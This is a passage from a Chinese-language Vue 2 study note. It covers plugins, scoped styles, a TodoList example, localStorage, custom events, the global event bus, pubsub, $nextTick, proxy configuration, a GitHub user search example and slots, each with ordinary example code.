
3. 定义插件：

    ```js
    对象.install = function (Vue, options) {
        // 1. 添加全局过滤器
        Vue.filter(....)
    
        // 2. 添加全局指令
        Vue.directive(....)
    
        // 3. 配置全局混入(合)
        Vue.mixin(....)
    
        // 4. 添加实例方法
        Vue.prototype.$myMethod = function () {...}
        Vue.prototype.$myProperty = xxxx
    }
    ```

4. 使用插件：```Vue.use()```



### ②定义插件

定义一个js文件，名字自定义，在这里使用plugins为名

```js
import Vue from "vue"
import mixin from "./mixin"

// 插件的使用
export default {
    install() {
        // 全局过滤器
        Vue.filter('mySlice', function(value) {
            return value.slice(0, 4)
        })

        // 定义混入
        Vue.mixin(mixin)

        // 给Vue原型上添加一个方法（vm和vc就能使用）
        Vue.prototype.hello = () => {alert("你好哇")}
    }
}
```



### ③使用插件

main.js（入口文件）中引入

```js
import plugins from './plugins'
// 使用插件 --> 可以使用多个
Vue.use(plugins)
```

然后我们就可以使用我们插件中的东西了

```vue
<template>
	<div>
        <!-- 使用插件中的过滤器 -->
		<h2>学生姓名：{{ name | mySlice }}</h2>
		<h2>学生年龄：{{ age }}</h2>
        <button @click="test">点我测试一下</button>
	</div>
</template>

<script>
export default {
	name: "School",
	data() {
		return {
			name: "小智哥哥哥哥哥",
			age: 18,
		};
	},
    methods: {
        test() {
            // 使用插件中定义的函数
            this.hello()
        }
    },
};
</script>
```





## 6	scoped样式

问题：如果我们在多个组件中声明相同的class名，那么就会导致后面引入的组件样式覆盖前面引入的，这是我们不希望出现的

解决：我们可以使用`<style scoped>`来解决组件样式冲突

![image-20211129102710448](D:\学习笔记\img\20211129102713.png)

它会帮我们生成一个属性来解决冲突





## 7	TodoList案例

**组件化编码流程（通用）** 

1.实现静态组件：抽取组件，使用组件实现静态页面效果 

2.展示动态数据： 

​	2.1. 数据的类型、名称是什么？ 

​	2.2. 数据保存在哪个组件？ 

3.交互——从绑定事件监听开始



### ①组件抽取图

![image-20211129104929405](D:\学习笔记\img\20211129105117.png)



抽取组件成这样



### ②代码实现

#### 1.MyHeader组件

```vue
<template>
	<div class="todo-header">
		<input
			type="text"
			placeholder="请输入你的任务名称，按回车键确认"
			v-model="title"
			@keyup.enter="add"
		/>
	</div>
</template>

<script>
import { nanoid } from "nanoid";
export default {
	name: "MyHeader",
	data() {
		return {
			// 收集输入的数据
			title: "",
		};
	},
	props: ["addTodo"],
	methods: {
		add() {
			// 将用户的数据封装成一个对象
			const todoObj = { id: nanoid(), title: this.title, done: false };
            this.addTodo(todoObj)
            // 重新将输入框的数据初始化
            this.title = ''
		},
	},
};
</script>

<style scoped>
/*header*/
.todo-header input {
	width: 560px;
	height: 28px;
	font-size: 14px;
	border: 1px solid #ccc;
	border-radius: 4px;
	padding: 4px 7px;
}

.todo-header input:focus {
	outline: none;
	border-color: rgba(82, 168, 236, 0.8);
	box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
		0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```



#### 2.MyItem组件

```vue
<template>
	<div>
		<li>
			<label>
				<input
					type="checkbox"
					v-model="todo.done"
					@click="handleChange(todo.id)"
				/>
				<span>{{ todo.title }}</span>
			</label>
			<button class="btn btn-danger" @click="deleteTodo(todo.id)">
				删除
			</button>
		</li>
	</div>
</template>

<script>
export default {
	name: "MyItem",
	methods: {
		handleChange(id) {
			this.select(id);
		},
        deleteTodo(id) {
            this.todoDelete(id)
        }
	},
	props: ["todo", "select", "todoDelete"],
};
</script>

<style scoped>
/*item*/
li {
	list-style: none;
	height: 36px;
	line-height: 36px;
	padding: 0 5px;
	border-bottom: 1px solid #ddd;
}

li label {
	float: left;
	cursor: pointer;
}

li label li input {
	vertical-align: middle;
	margin-right: 6px;
	position: relative;
	top: -1px;
}

li button {
	float: right;
	display: none;
	margin-top: 3px;
}

li:before {
	content: initial;
}

li:last-child {
	border-bottom: none;
}
li:hover {
	background-color: #ddd;
}

li:hover button {
	display: block;
}
</style>
```



#### 3.MyList组件

```vue
<template>
	<ul class="todo-main">
		<MyItem
			v-for="todo in todoList"
			:key="todo.id"
			:todo="todo"
			:select="select"
            :todoDelete="todoDelete"
		/>
	</ul>
</template>

<script>
import MyItem from "./MyItem.vue";
export default {
	name: "MyList",
	components: { MyItem },
	data() {
		return {};
	},
	// 获取传过来的todoList
	props: ["todoList", "select", "todoDelete"],
};
</script>

<style scoped>
/*main*/
.todo-main {
	margin-left: 0px;
	border: 1px solid #ddd;
	border-radius: 2px;
	padding: 0px;
}

.todo-empty {
	height: 40px;
	line-height: 40px;
	border: 1px solid #ddd;
	border-radius: 2px;
	padding-left: 5px;
	margin-top: 10px;
}
</style>
```



#### 4.MyFooter组件

```vue
<template>
	<div class="todo-footer" v-show="total">
		<label>
			<!-- 第一种实现方式 -->
			<!-- <input type="checkbox" :checked="isAll" @click="selectAll"/> -->
			<!-- 第二种实现方式 -->
			<input type="checkbox" v-model="isAll" />
		</label>
		<span>
			<span>已完成{{ doneTotal }}</span> / 全部{{ total }}
		</span>
		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
	</div>
</template>

<script>
export default {
	name: "MyFooter",
	props: ["todoList", "checkAll", "clearAllTodo"],
	methods: {
		// 清楚所有已经完成的todo
		clearAll() {
			this.clearAllTodo();
		},
		// 选择所有
		// selectAll(e) {
		//     this.checkAll(e.target.checked)
		// }
	},
	computed: {
		total() {
			return this.todoList.length;
		},
		doneTotal() {
			/* 
                第一个参数（pre）：pre的值是函数return回来的值，初始值为0(自己设置)
                第二个参数（todo）：遍历数组的每一项
                第三个参数
            */
			// 简写
			return this.todoList.reduce(
				(pre, todo) => pre + (todo.done ? 1 : 0),
				0
			);
		},
		isAll: {
			get() {
				return this.total === this.doneTotal && this.total > 0;
			},
			set(value) {
				this.checkAll(value);
			},
		},
	},
};
</script>

<style scoped>
/*footer*/
.todo-footer {
	height: 40px;
	line-height: 40px;
	padding-left: 6px;
	margin-top: 5px;
}

.todo-footer label {
	display: inline-block;
	margin-right: 20px;
	cursor: pointer;
}

.todo-footer label input {
	position: relative;
	top: -1px;
	vertical-align: middle;
	margin-right: 5px;
}

.todo-footer button {
	float: right;
	margin-top: 5px;
}
</style>
```



#### 5.App组件

```vue
<template>
	<div>
		<div class="todo-container">
			<div class="todo-wrap">
				<MyHeader :addTodo="addTodo" />
				<MyList
					:todoList="todoList"
					:select="select"
					:todoDelete="todoDelete"
				/>
				<MyFooter
					:todoList="todoList"
					:checkAll="checkAll"
					:clearAllTodo="clearAllTodo"
				/>
			</div>
		</div>
	</div>
</template>

<script>
import MyHeader from "./components/MyHeader.vue";
import MyList from "./components/MyList.vue";
import MyFooter from "./components/MyFooter.vue";

export default {
	name: "App",
	components: { MyHeader, MyList, MyFooter },
	data() {
		return {
			todoList: [
				{ id: "001", title: "唱歌", done: true },
				{ id: "002", title: "跳舞", done: true },
				{ id: "003", title: "rapper", done: true },
			],
		};
	},
	methods: {
		// 这个方法是传个MyHeader组件添加值的
		addTodo(todo) {
			this.todoList.unshift(todo);
		},
		// 勾选or取消
		select(id) {
			this.todoList.forEach((todo) => {
				if (todo.id === id) todo.done = !todo.done;
			});
		},
		// 删除一个todo
		todoDelete(id) {
			this.todoList = this.todoList.filter((todo) => todo.id != id);
		},
		// 选择所有
		checkAll(done) {
			this.todoList.forEach((todo) => {
				todo.done = done;
			});
		},
		// 清除所有已完成的todo
		clearAllTodo() {
			this.todoList = this.todoList.filter((todo) => {
				return !todo.done
			});
		},
	},
};
</script>

<style lang="css">
/*base*/
body {
	background: #fff;
}

.btn {
	display: inline-block;
	padding: 4px 12px;
	margin-bottom: 0;
	font-size: 14px;
	line-height: 20px;
	text-align: center;
	vertical-align: middle;
	cursor: pointer;
	box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
		0 1px 2px rgba(0, 0, 0, 0.05);
	border-radius: 4px;
}

.btn-danger {
	color: #fff;
	background-color: #da4f49;
	border: 1px solid #bd362f;
}

.btn-danger:hover {
	color: #fff;
	background-color: #bd362f;
}

.btn:focus {
	outline: none;
}

.todo-container {
	width: 600px;
	margin: 0 auto;
}
.todo-container .todo-wrap {
	padding: 10px;
	border: 1px solid #ddd;
	border-radius: 5px;
}
</style>
```



### ③总结

1. 组件化编码流程：

    ​	(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

    ​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

    ​			1).一个组件在用：放在组件自身即可。

    ​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

    ​	(3).实现交互：从绑定事件开始。

2. props适用于：

    ​	(1).父组件 ==> 子组件 通信

    ​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为**props是不可以修改的！**

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

![image-20211129165257361](D:\学习笔记\img\20211129165258.png)





## 8	webStorage

### ①说明

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

    1. ```xxxxxStorage.setItem('key', 'value');```
        	该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

    2. ```xxxxxStorage.getItem('person');```

        ​		该方法接受一个键名作为参数，返回键名对应的值。

    3. ```xxxxxStorage.removeItem('key');```

        ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

    4. ``` xxxxxStorage.clear()```

        ​		该方法会清空存储中的所有数据。

4. 备注：

    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
    2. LocalStorage存储的内容，需要手动清除才会消失。
    3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
    4. ```JSON.parse(null)```的结果依然是null。



### ②案例演示

localStorage

```html
<body>
    <button onclick="addItem()">点我添加</button>
    <button onclick="getItem()">点我获取</button>
    <button onclick="deleteItem()">点我删除msg</button>
    <button onclick="clearItem()">点我清空数据</button>
    <script>
        let person = {id:'123', age: 18}
        // 添加
        function addItem() {
            localStorage.setItem('msg', 'hello')
            localStorage.setItem('number', 666)
            localStorage.setItem('p', JSON.stringify(person))
        }
        // 获取
        function getItem() {
            console.log(localStorage.getItem('msg'));
            console.log(localStorage.getItem('number'));
            console.log(JSON.parse(localStorage.getItem('p')));
        }
        // 删除
        function deleteItem() {
            localStorage.removeItem('msg')
        }
        // 清空
        function clearItem() {
            localStorage.clear()
        }
    </script>
</body>
```

sessionStorage

```html
<body>
    <button onclick="addItem()">点我添加</button>
    <button onclick="getItem()">点我获取</button>
    <button onclick="deleteItem()">点我删除msg</button>
    <button onclick="clearItem()">点我清空数据</button>
    <script>
        let person = { id: '123', age: 18 }
        // 添加
        function addItem() {
            sessionStorage.setItem('msg', 'hello')
            sessionStorage.setItem('number', 666)
            sessionStorage.setItem('p', JSON.stringify(person))
        }
        // 获取
        function getItem() {
            console.log(sessionStorage.getItem('msg'));
            console.log(sessionStorage.getItem('number'));
            console.log(JSON.parse(sessionStorage.getItem('p')));
        }
        // 删除
        function deleteItem() {
            sessionStorage.removeItem('msg')
        }
        // 清空
        function clearItem() {
            sessionStorage.clear()
        }
    </script>
</body>
```



### ③改造TodoList案例

App组件中的data中的数据需要从本地缓存中拿

```js
data() {
    return {
        // 初始化数据 --> localStorage.getItem(xxx)如果没有获取到值就会返回null，要防止这种情况出现
        todoList: JSON.parse(localStorage.getItem("todoList")) || [],
    };
},
```

同时还要开启监视，数据一发生变化就修改本地的缓存

```js
watch: {
    todoList: {
        // 开启深度侦听 --> 侦听每个对象的每个属性值
        deep: true, 
            handler(value) {
            localStorage.setItem("todoList", JSON.stringify(value));
        },
    },
},
```





## 9	组件的自定义事件

### ① 说明

1.   一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

    1. 第一种方式，在父组件中：```<Demo @xiaozhi="test"/>```  或 ```<Demo v-on:xiaozhi="test"/>```

    2. 第二种方式，在父组件中：

        ```js
        <Demo ref="demo"/>
        ......
        mounted(){
           this.$refs.xxx.$on('atguigu',this.test)
        }
        ```

    3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. **注意**：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！

==**总结**：给那个组件绑定自定义事件，那就到那个组件中触发事件==



### ②自定义事件

#### 1.vue组件

```vue
<template>
	<div>
		<!-- 通过符父组件给子组件传递函数的props实现：子传给父数据 -->
		<School :getSchoolName="getSchoolName" />

		<!-- 通过符父组件给子组件绑定一个自定义事件的实现：子传给父数据（第一种方式：@或v-on） -->
		<!-- <Student @test="getStudentName"/> -->
		<!-- <Student @test.once="getStudentName"/> -->		<!-- 自定义事件也可以使用限定修饰符 -->
		<Student @test="getStudentName"/>

		<!-- 通过符父组件给子组件绑定一个自定义事件的实现：子传给父数据（第二种方式：ref属性 -->
		<!-- <Student ref="student" /> -->
	</div>
</template>

<script>
import Student from "./components/Student.vue";
import School from "./components/School.vue";
export default {
	name: "App",
	components: { Student, School },
	methods: {
		getSchoolName(name) {
			console.log("App收到了学校名称 ——>", name);
		},
		getStudentName(name, a, b, c) {
			console.log("App收到了学生姓名 ——>", name);
			// console.log("App收到了学生姓名 ——>", name, a, b, c);
		},
	},
	mounted() {
		// this.$refs.student获取到student组件的实例对象
		// this.$refs.student.$on("test", this.getStudentName); // 绑定自定义事件
		// this.$refs.student.$once("test", this.getStudentName); // 只执行一次

		// 这里做一个测试，这种方式用起来比v-on的灵活，没有需求，那么就用v-on方式
		// setTimeout(() => {
		// 	this.$refs.student.$on("test", this.getStudentName)// 绑定自定义事件
		// }, 3000)
	},
};
</script>

<style>
</style>
```



#### 2.school组件(props方式)

使用props的方式子组件给父组件传递数据

```vue
<template>
	<div class="school">
		<h2>学校名称：{{ name }}</h2>
		<h2>学校地址：{{ address }}</h2>
        <button @click="sendSchoolName">把学校名给App</button>
	</div>
</template>

<script>
export default {
    data() {
        return {
            name: '社会大学',
            address: '社会',
        }
    },
    props: ['getSchoolName'],
    methods: {
        sendSchoolName() {
            this.getSchoolName(this.name)
        },
    },
};
</script>

<style>
    .school {
        height: 150px;
        background-color:chartreuse;
    }
</style>
```



#### 3.student(自定义事件和ref属性方式)

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{ name }}</h2>
		<h2>学生年龄：{{ age }}</h2>
        <h2>当前的number值为：{{number}}</h2>
		<button @click="add">点我number+1</button>
		<button @click="sendStudentlName">把学生名给学校</button>
		<button @click="unbind">解除自定义事件绑定</button>
        <button @click="death">销毁当前Student组件的实例(vc)</button>
	</div>
</template>

<script>
export default {
	data() {
		return {
			name: "社会大学",
			age: 18,
            number: 0,
		};
	},
	methods: {
        add() {
            console.log('add被调用了');
            this.number++
        },
		sendStudentlName() {
			// 触发Student实例身上的test事件，可以传递多个参数，这边传，对应的值
			this.$emit("test", this.name);
			// this.$emit('test', this.name, 777, 888, 999)
		},
        unbind() {
            this.$off('test')               // 解绑一个自定义事件
            // this.$off(['test', 'test2'])    // 解绑多个自定义事件
            // this.$off()                     // 解绑所有自定义事件
        },
        death() {
            // 销毁当前的Student组件实例，销毁后所有Student实例的自定义事件都不生效
            this.$destroy()
        }
	},
};
</script>

<style>
.student {
	height: 150px;
	background-color: aquamarine;
}
</style>
```



### ③修改todoList案例

就是将会传过去的方法改成自定义事件，然后到组件中出触发自定义事件



### ④vue工具查看自定义事件

![image-20211201164807700](D:\学习笔记\img\20211201164808.png)





## 10	全局事件总线(GlobalEventBus)

### ①说明

所谓的全局事件总线其实就是工具人，用它来进行组件间数据的传递

**工作原理**：首先需要数据的组件有一个事件的回调，另外一个组件呢就触发这个自定义事件，然后将数据传给需要数据的那个组件

![image-20211201162705356](D:\学习笔记\img\20211201162706.png)

**全局事件总线的要求**：

1.  所有组件都能看到它
2.  拥有$on、$emit、$off
3.  满足这两个条件的有组件实例对象(vc)、vm

**注意**：

1.  vueComponent是有Vue.extent创建出来的，是不能直接new的，要间接创建，是比较麻烦的
2.  所以在开发中**常用的是vm**，使用beforeCreate钩子创建，直接`const vm = new Vue()`方式的话是不行的，因为组件初始化已经完成了，这个时候如果有组件是使用了全局事件总线的话就会报错，因为还没创建



### ②创建全局事件总线的方式

```js
// 第一种方式 --> 创建一个组件实例对象(vc)
const demo = Vue.extend({})
const d = new demo()
// 将这个组件实例对象(vc)放到Vue原型上
Vue.prototype.$bus = d
```

```js
// 创建vm
new Vue({
    el: "#app",
    render: h => h(App),
    // 第二种方式 --> 在beforeCreate钩子中执行
    beforeCreate() {
        // 这个时候vm已经被创建了，this指向的就是vm
        Vue.prototype.$bus = this
    }
})
```



### ③兄弟组件间传递数据

按照上面的方式创建了全局事件总线

**School组件**

```vue
<template>
	<div class="school">
		<h2>学校名称：{{ name }}</h2>
		<h2>学校地址：{{ address }}</h2>
	</div>
</template>

<script>
export default {
    data() {
        return {
            name: '社会大学',
            address: '社会',
        }
    },
    mounted() {
        this.$bus.$on('getName', (data) => {
            console.log("获取到Student组件传来的数据", data);
        })
    },
};
</script>

<style>
    .school {
        height: 150px;
        background-color:chartreuse;
    }
</style>
```

**Student组件**

```vue
<template>
	<div class="student">
		<h2>学生姓名：{{ name }}</h2>
		<h2>学生年龄：{{ age }}</h2>
		<button @click="sendName">点我将名字传给School组件</button>
	</div>
</template>

<script>
export default {
	data() {
		return {
			name: "法外狂徒张三",
			age: 18,
            number: 0,
		};
	},
	methods: {
        sendName() {
			// this.bus得到的就是全局事件总线(vm对象)
			this.$bus.$emit('getName', this.name)	// 触发getName事件，将name传给回调函数
		}
	},
};
</script>

<style>
.student {
	height: 150px;
	background-color: aquamarine;
}
</style>
```



### ④改造todoList案例

子传父的方式有多种，在这里我们将子传孙的MyList组件改造一下（使用全局事件总线）





## 11	消息订阅与发布(pubsub)

### ①说明

有很多的库可以做，这里使用pubsub库

1.   一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

    1. 安装pubsub：```npm i pubsub-js```

    2. 引入: ```import pubsub from 'pubsub-js'```

    3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

        ```js
        methods(){
          demo(data){......}
        }
        ......
        mounted() {
          this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
        }
        ```

    4. 提供数据：```pubsub.publish('xxx',数据)```

    5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>



### ②修改全局事件总线的案例

Student组件

```vue
<script>
// 引入pubsub
import pubsub from 'pubsub-js'
export default {
    ......
	methods: {
        sendName() {
			// 发布消息
			pubsub.publish('test', this.name)
		}
	},
};
</script>
```

School组件

```vue
<script>
// 引入pubsub
import pubsub from 'pubsub-js'
export default {
	......
    mounted() {
        // 订阅消息 --> 两个参数，第一个是消息名，第二个才是消息内容
        // 可以使用_占位，因为第一个数据是消息名，不是消息内容，我们需要的是消息内容
        this.pubId = pubsub.subscribe('test', (_, data) => {     
            console.log('有人发布了test消息 --> ', data);
        })
    },
    // 销毁之前取消订阅
    beforeDestroy() {
        pubsub.unsubscribe(this.pubId)
    },
};
</script>
```

实现的效果都是一样的，这种方式比较少用，一般采用全局事件总线的方式



### ③修改todoList案例

将App组件和MyItem之间的通信改成消息订阅与发布的方式





## 12	$nextTick

1. 语法：```this.$nextTick(回调函数)```

2. 作用：在下一次 DOM 更新结束后执行其指定的回调。

3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

    什么意思呢：就是你当前的元素需要获取还没有渲染的元素的时候，需要用到这个`$nextTick`去解决，因为需要的元素没有渲染出来就不能使用，可以使用`setTimeout`去解决，但是官方给出了`$nextTick`可以解决这个问题（看下面案例）

**案例**

还是吧todoList拿来做案例，给每一项添加一个更新按钮

**App组件**

```vue
<script>
export default {
	......
	methods: {
        ......
		// 更新一个todo
		updateTodo(id, title) {
			this.todoList.forEach((todo) => {
				if (todo.id === id) todo.title = title
			})
		}
	},
	mounted() {
		......
		this.$bus.$on("updateTodo", this.updateTodo)
	},
};
</script>
```

**MyItem组件**

```vue
<template>
		......
			<span v-show="!todo.isEdit">{{ todo.title }}</span>
			<input
				type="text"
				ref="inputTitle"
				@blur="handleBlur(todo, $event)"
				v-show="todo.isEdit"
				v-model="todo.title"
			/>
		</label>
		......
		<button
			v-show="!todo.isEdit"
			class="btn btn-edit"
			@click="updateTodo(todo)"
		>
			更新
		</button>
	</li>
</template>

<script>
import pubsub from "pubsub-js";
export default {
	......
	methods: {
		......
		// 点击这个按钮出现一个input框
		updateTodo(todo) {
			// hasOwnProperty函数就是判断这个对象有没有对应的属性
			if (todo.hasOwnProperty("isEdit")) {
				// 如果存在，那么就直接设为true
				todo.isEdit = true;
			} else {
				// 第一次点击按钮的时候就进行添加
				this.$set(todo, "isEdit", true);
			}
			/* 
				要使用$nextTick函数，因为在todo的isEdit属性修改完毕模板还没有重新刷新，
				要等整个函数结束才能刷新模板，所以这个时候去拿dom元素是不行的，因为它还在隐藏状态，
				这个函数的作用就是会等待对应的元素加载出来
			*/
			this.$nextTick(function () {
				// 焦点聚集
				this.$refs.inputTitle.focus();
			});
		},
		// 失去焦点执行函数
		handleBlur(todo, e) {
			todo.isEdit = false;
			if (!e.target.value.trim()) return alert("输入不能为空");
			this.$bus.$emit("updateTodo", todo.id, e.target.value);
		},
	},
};
</script>
```





## 13	Vue封装的过度与动画

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 写法：

    1. 准备好样式：

        - 元素进入的样式：
            1. v-enter：进入的起点
            2. v-enter-active：进入过程中
            3. v-enter-to：进入的终点
        - 元素离开的样式：
            1. v-leave：离开的起点
            2. v-leave-active：离开过程中
            3. v-leave-to：离开的终点

    2. 使用```<transition>```包裹要过度的元素，并配置name属性：

        ```vue
        <transition name="hello">
        	<h1 v-show="isShow">你好啊！</h1>
        </transition>
        ```

    3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。

使用第三方库 --> animate.css





## 14	Vue脚手架配置代理

### ①方法一

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）



### ②方法二

​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。



### ③请求服务器案例

使用python写的两个接口	--> 5000端口和5001端口

```python
from flask import Flask, request
from flask import jsonify

app = Flask(__name__)

@app.route('/user')
def getUserInfo():
    userInfo = [
        {"id":"001", "name":"老刘", "age":18},
        {"id":"002", "name":"李四", "age":19},
        {"id":"003", "name":"张三", "age":20},
    ]
    return jsonify(userInfo)

if __name__ == '__main__':
    app.run(port='5000')
```

```python
from flask import Flask, request
from flask import jsonify

app = Flask(__name__)

@app.route('/cat')
def getUserInfo():
    userInfo = [
        {"id":"001", "name":"红宝石", "price":18000000},
        {"id":"002", "name":"劳斯莱斯", "price":19000000},
        {"id":"003", "name":"法拉利", "price":200000000},
    ]
    return jsonify(userInfo)

if __name__ == '__main__':
    app.run(port='5001')
```

**前端代码**

```vue

```





## 15	github案例

### ①public/index.html

```html
  <!-- 引入外部css文件 -->
  <link rel="icon" href="<%= BASE_URL %>css/bootstrap.css">
```



### ②App组件

```vue
<template>
	<div class="container">
		<Search/>
		<List/>
	</div>
</template>

<script>
/*
	注意：
		这种方式引入会报错，因为它用到了第三方的库，vue-cli会严格检查
		所以我们将样式放到public文件夹，用link标签引用
*/
// import 'bootstrap.css';
import Search from './components/Search.vue';
import List from './components/List.vue';
export default {
	name: "App",
	components: {Search, List}
};
</script>

<style>
.album {
	min-height: 50rem; /* Can be removed; just added for demo purposes */
	padding-top: 3rem;
	padding-bottom: 3rem;
	background-color: #f7f7f7;
}

.card {
	float: left;
	width: 33.333%;
	padding: 0.75rem;
	margin-bottom: 2rem;
	border: 1px solid #efefef;
	text-align: center;
}

.card > img {
	margin-bottom: 0.75rem;
	border-radius: 100px;
}

.card-text {
	font-size: 85%;
}
</style>
```



### ③Search组件

```vue
<template>
	<section class="jumbotron">
		<h3 class="jumbotron-heading">Search Github Users</h3>
		<div>
			<input
				type="text"
				placeholder="enter the name you search"
				v-model="keyWord"
			/>&nbsp;
			<button @click="getUserInfo">Search</button>
		</div>
	</section>
</template>

<script>
import axios from "axios";
export default {
	name: "Search",
	data() {
		return {
			keyWord: "",
		};
	},
	methods: {
		getUserInfo() {
			// 请求之前显示请求加载中
			this.$bus.$emit("updateListData", {
				isFirst: false,
				isLoading: true,
				isError: false,
			});
			axios
				.get(`https://api.github.com/search/users?q=${this.keyWord}`)
				.then(
					(response) => {
						// 成功就将数据交给List组件
						this.$bus.$emit("updateListData", {
							users: response.data.items,
                            isLoading: false
						});
					},
					(error) => {
						// 请求失败，打印失败信息
						this.$bus.$emit("updateListData", {
							isError: true,
                            isLoading: false,
							users: [],
						});
					}
				);
		},
	},
};
</script>
```



### ④List组件

```vue
<template>
	<div class="row">
		<h1 v-show="info.isFirst">Welcome</h1>
		<h1 v-show="info.isLoading">Loading...</h1>
		<h1 v-show="info.isError">请求失败</h1>
		<div class="card" v-for="user in info.users" :key="user.login">
			<a :href="user.html_url" target="_blank">
				<img :src="user.avatar_url" style="width: 100px" />
			</a>
			<p class="card-text">{{ user.login }}</p>
		</div>
	</div>
</template>

<script>
export default {
	name: "List",
	data() {
		return {
			info: {
				users: [],
				isFirst: true,
				isLoading: false,
				isError: false,
			},
		};
	},
	mounted() {
		this.$bus.$on("updateListData", (dataObj) => {
			// 这是ES6的写法，两个对象会进行比较，dataObj会替换info中有的值，dataObj没有的就不会替换info中的
			this.info = { ...this.info, ...dataObj };
		});
	},
};
</script>
```



### ⑤vue-resource

了解即可，在vue1.0版本用的比较多，官方已经不再维护，<span style="color: red;">不推荐使用</span>

**安装**：`npm i vue-resource`

**使用**：Vue.use(vueResource)



#### ①引入vue-resource

```js
// 引入vue-resource
import vueResource from 'vue-resource';
// 使用vue-resource
Vue.use(vueResource)
```



#### ②使用vue-resource实现请求

和axios用法一样，将axios修改为this.$html即可

```js
this.$tml.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
    (response) => {
        // 成功就将数据交给List组件
        this.$bus.$emit("updateListData", {
            users: response.data.items,
            isLoading: false,
        });
    },
    (error) => {
        // 请求失败，打印失败信息
        this.$bus.$emit("updateListData", {
            isError: true,
            isLoading: false,
            users: [],
        });
    }
);
```

![image-20211202190633582](D:\学习笔记\img\20211202190635.png)

这个是我们使用vue-resource才有的





## 16	插槽

**说明**：使用同一个组件，需要展示不同的内容的时候就需要使用插槽

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。
2. 分类：默认插槽、具名插槽、作用域插槽
3. 使用方式：看下面列子



### ①初始状态

**App组件（父组件）**

```vue
<template>
    <div class="container">
        <Category :listData="foods"/>
        <Category :listData="games"/>
        <Category :listData="films"/>
    </div>
</template>

<script>
import Category from './components/Category.vue';
export default {
    name: 'App',
    components: {Category},
    data() {
        return {
            foods:['火锅','烧烤','小龙虾','牛排'],
            games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
            films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》'],
        }
    },
};
</script>

<style>
.container{
    display: flex;
    justify-content: space-around;
}
</style>
```

**Category组件**

```vue
<template>
    <div class="category">
        <ul v-for="item in listData" :key="item"> 
            <li>{{item}}</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: 'Category',
    props: ['listData']
};
</script>

<style>
	.category{
		background-color: skyblue;
		width: 200px;
		height: 300px;
	}
	h3{
		text-align: center;
		background-color: orange;
	}
	video{
		width: 100%;
	}
	img{
		width: 100%;
	}
</style>
```



### ②默认插槽

**说明**：就是使用`<slot></slot>`标签来占位，然后使用的时候可以传递结构或者不传，不传的话它就会使用`<slot></slot>`标签体中的内容

**Category组件修改**

```vue
<template>
	<div class="category">
		<h3>{{ title }}分类</h3>
		<!-- <li>{{item}}</li> -->
		<!-- 使用插槽 -> 默认插槽 -->
		<slot>我是插槽，如果使用者没有给我传入结构，那么我就显示</slot>
	</div>
</template>

<script>
export default {
	name: "Category",
	props: ["title"],
};
```

**App组件（父组件）**

```vue
<template>
    <div class="container">
        <Category title="美食">
